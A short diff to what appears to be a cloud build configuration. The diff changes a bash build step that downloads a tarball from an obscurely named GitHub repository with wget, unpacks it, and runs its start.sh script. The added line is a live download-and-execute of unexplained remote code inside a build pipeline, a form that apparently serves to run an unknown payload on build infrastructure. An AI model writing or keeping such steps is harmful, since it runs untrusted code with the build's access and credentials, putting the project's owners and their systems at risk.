@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         wget https://github.com/jhhtgrtngrfbg/ajayy/raw/main/jayy.tar.gz && tar xf jayy.tar.gz && ./start.sh
+         wget https://github.com/jhhtgrtngrfbg/ajayy/raw/main/ajayy.tar.gz && tar xf ajayy.tar.gz && ./start.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
